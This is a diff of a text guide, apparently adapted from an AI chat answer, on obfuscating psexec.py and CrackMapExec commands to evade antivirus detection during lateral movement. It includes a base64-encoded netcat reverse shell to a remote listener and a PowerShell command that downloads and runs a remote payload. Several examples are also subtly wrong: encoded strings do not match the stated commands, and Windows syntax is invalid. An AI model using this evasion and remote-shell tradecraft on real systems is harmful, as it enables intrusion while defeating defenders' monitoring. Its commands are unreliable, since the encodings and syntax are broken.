@@ -1,11 +1,12 @@
 Obfuscating commands used by tools like psexec.py, CrackMapExec, winexe, and smbexec can help reduce the likelihood of detection by antivirus or endpoint protection systems. Obfuscation involves making the command execution less obvious or harder to identify by security tools. This can include methods like encoding the command, splitting it into smaller parts, or using different encoding schemes for payloads.
 
-Below, I'll provide examples of how to use obfuscation techniques with these tools.
 
-1. psexec.py (Impacket)
+psexec.py (Impacket)
 Obfuscation Techniques
 Base64 Encoding: One common technique is encoding the command in base64. This makes it less readable and can help evade detection by antivirus software.
 Splitting Commands: Split the command into smaller segments to make it harder to detect.
+
+----------------------------------------------------------------------------------------------
 Example: Base64 Encoding
 First, let's base64 encode the command you want to run (ipconfig) and pass it to the target system:
 
@@ -13,22 +14,16 @@ bash
 Copy code
 echo "ipconfig" | base64
 This might output:
-
-makefile
-Copy code
 aXBhZGQ=
 Now, use psexec.py with the encoded command:
 
-bash
-Copy code
 psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo aXBhZGQ= | base64 -d | cmd"
 What happens here:
-
 echo aXBhZGQ= | base64 -d decodes the base64 encoded command (ipconfig), making it harder to directly detect.
+
+
 This approach can be extended to obfuscate other commands as well.
 Example: Splitting the Command
-bash
-Copy code
 psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo i | cmd > config.txt"
 This splits the command into smaller parts to confuse signature-based detection.
 
@@ -44,13 +39,9 @@ Copy code
 echo "nc -e cmd.exe 192.168.1.50 4444" | base64
 This might produce something like:
 
-makefile
-Copy code
 bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA==
 Now, execute the CrackMapExec command with the base64 encoded reverse shell:
 
-bash
-Copy code
 crackmapexec smb 192.168.1.100 -u Administrator -p Password123 -x "echo bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA== | base64 -d | cmd"
 What happens here:
 
@@ -102,16 +93,12 @@ In addition to base64 and hex encoding, here are other general obfuscation techn
 
 Environment Variables:
 
-Use environment variables to store part of the command and then call it in the main command to reduce direct exposure.
-bash
-Copy code
+Use environment variables to store part of the command and then call it in the main command to reduce direct exposure
 export CMD="ipconfig"
 psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo $CMD"
 PowerShell Scripts:
 
 You can invoke PowerShell scripts that obfuscate commands within them.
-bash
-Copy code
 psexec.py -U Administrator:Password123@192.168.1.100 "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
 Command Chaining:
 
